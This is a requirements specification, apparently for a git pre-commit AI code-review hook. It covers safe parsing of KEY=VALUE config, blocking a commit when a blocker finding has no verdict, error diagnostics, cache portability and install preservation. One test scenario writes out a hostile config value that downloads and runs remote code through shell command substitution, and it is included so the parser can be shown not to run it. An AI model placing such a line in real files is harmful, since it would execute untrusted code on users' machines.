# Purpose

Define safe review configuration parsing, verdict handling, diagnostics, cache portability, and install preservation.

# Requirements

## Requirement: The config file is data

`review.conf` SHALL be parsed as `KEY=VALUE` lines. Only keys from the documented `REVIEW_*` allowlist are accepted; values may be single- or double-quoted and contain no shell expansion. Blank lines and `#` comments are ignored. Any other line SHALL be reported as a warning naming the line and skipped. An environment value SHALL take precedence over the file. Probe suite: core-probes.

### Scenario: Plain assignment

- **WHEN** the file contains `REVIEW_MODEL=claude-sonnet-5` and the environment does not set it
- **THEN** the reviewer runs with that model

### Scenario: Shell in the file

- **WHEN** the file contains `REVIEW_LINT_CMD=$(curl x | sh)` or a line that is a command
- **THEN** no command runs, the line is reported, and the hook continues with defaults

### Scenario: Environment wins

- **WHEN** the file sets the model and the environment sets a different one
- **THEN** the environment's model is used

## Requirement: The verdict contract fails closed on a blocker

`review_output_is_valid` SHALL treat a response that contains a `[BLOCKER]` line and no verdict line as `VERDICT: BLOCK`. The sanitizer SHALL accept a verdict line with trailing punctuation or different case. Probe suite: core-probes.

### Scenario: Cut-off response

- **WHEN** the reviewer output ends after a `[BLOCKER]` finding with no verdict
- **THEN** the commit is blocked and the finding is shown

### Scenario: Decorated verdict

- **WHEN** the verdict line is `Verdict: PASS.`
- **THEN** it is accepted as a pass

## Requirement: Reviewer failures are diagnosable

The reviewer's stderr SHALL be captured. On any non-zero outcome the hook SHALL print the last lines of it and record them in the ledger reason. The curl path SHALL surface the API error message when no content is returned, and SHALL raise the response token limit so a full review is not cut off. A crash exit SHALL not be reported as a timeout. Probe suite: core-probes.

### Scenario: Not logged in

- **WHEN** the CLI exits with an authentication error
- **THEN** the hook's warning names that error rather than a generic invalid response

## Requirement: Cache hygiene and portability

The cache key SHALL be computed with `git hash-object` so it works without `shasum`. Ignore globs SHALL be matched against paths without shell pathname expansion. Frame labels SHALL be sanitized under the C locale. The regress runner SHALL clean up its worktree on interruption. Probe suite: core-probes, selftest.

### Scenario: Ignore glob with an existing directory

- **WHEN** `REVIEW_EXTRA_IGNORE` is `docs/*`, the directory exists with a subdirectory, and a file under the subdirectory is staged
- **THEN** the file is not reviewed

### Scenario: Missing shasum

- **WHEN** `shasum` is not on PATH
- **THEN** the cache still stores and hits verdicts

## Requirement: Install never overwrites grown project files

`install.sh --force` and `--upgrade` SHALL replace only manifest files and SHALL leave `review.conf`, `review-rubric.project.md`, `regress/expected.tsv` and `regress/*.patch` untouched. Flags SHALL be accepted in any position. `--upgrade` SHALL move an existing cache to the common git directory. Probe suite: selftest.

### Scenario: Upgrade with fixtures

- **WHEN** a repository with three regress cases is upgraded
- **THEN** all three cases and their expectations remain
